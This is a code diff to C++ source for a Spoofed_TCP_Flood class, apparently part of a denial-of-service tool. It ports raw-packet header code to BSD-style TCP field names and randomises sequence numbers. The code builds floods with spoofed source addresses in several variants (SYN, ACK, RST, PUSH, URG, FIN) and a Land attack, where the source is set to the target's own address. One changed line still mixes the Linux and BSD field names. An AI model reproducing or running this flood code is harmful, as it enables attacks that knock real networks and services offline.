@@ -62,7 +62,7 @@ void Spoofed_TCP_Flood::attack() {
             memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
             memcpy(pseudogram + sizeof(struct pseudo_header) , tcp , sizeof(struct tcphdr) + strlen(buf));
 
-            tcp->check = csum( (unsigned short*) pseudogram , psize);
+            tcp->th_sum = csum( (unsigned short*) pseudogram , psize);
 
 
             if((static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1){
@@ -85,27 +85,27 @@ Spoofed_TCP_Flood::Spoofed_TCP_Flood(std::shared_ptr<Config> conf) : Spoofed_Flo
 void Spoofed_TCP_Flood::override_headers(tcphdr *tcp, iphdr *ip){
     switch (conf->vector){
         case Config::SpoofedSyn:
-            tcp->syn = 1;
+            tcp->th_flags = TH_SYN;
             break;
         case Config::SpoofedAck:
-            tcp->ack = 1;
+            tcp->th_flags = TH_ACK;
             break;
         case Config::SpoofedRST:
-            tcp->rst = 1;
+            tcp->th_flags = TH_RST;
             break;
         case Config::SpoofedPUSH:
-            tcp->psh = 1;
+            tcp->th_flags = TH_PUSH;
             break;
         case Config::SpoofedURG:
-            tcp->urg = 1;
+            tcp->th_flags = TH_URG;
             break;
         case Config::SpoofedFin:
-            tcp->fin = 1;
+            tcp->th_flags = TH_FIN;
             break;
         case Config::Land:
-            tcp->syn = 1;
+            tcp->th_flags = TH_SYN;
             ip->saddr = ip->daddr;
-            tcp->source = tcp->dest;
+            tcp->source = tcp->th_dport;
         default:break;
     }
 }
@@ -126,18 +126,12 @@ void Spoofed_TCP_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
     ip->check = csum((unsigned short *) buf, ip->tot_len);
 
     // TCP Struct
-    tcp->source = htons(static_cast<uint16_t>(s_port));
-    tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
-    tcp->seq = 0;
-    tcp->ack_seq = 0;
-    tcp->doff = 5;  //tcp header size
-    tcp->fin=0;
-    tcp->syn=0;
-    tcp->rst=0;
-    tcp->psh=0;
-    tcp->ack=0;
-    tcp->urg=0;
-    tcp->window = htons (5840);
-    tcp->check = 0;
-    tcp->urg_ptr = 0;
+    tcp->th_sport = htons(static_cast<uint16_t>(s_port));
+    tcp->th_dport = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
+    tcp->th_seq = htonl(static_cast<uint32_t>(Randomizer::randomInt(0, RAND_MAX)));
+    tcp->th_ack = htonl(static_cast<uint32_t>(Randomizer::randomInt(0, RAND_MAX)));
+    tcp->th_off = 5;
+    tcp->th_win = htons(5840);
+    tcp->th_sum = 0;
+    tcp->th_flags = 0;
 }
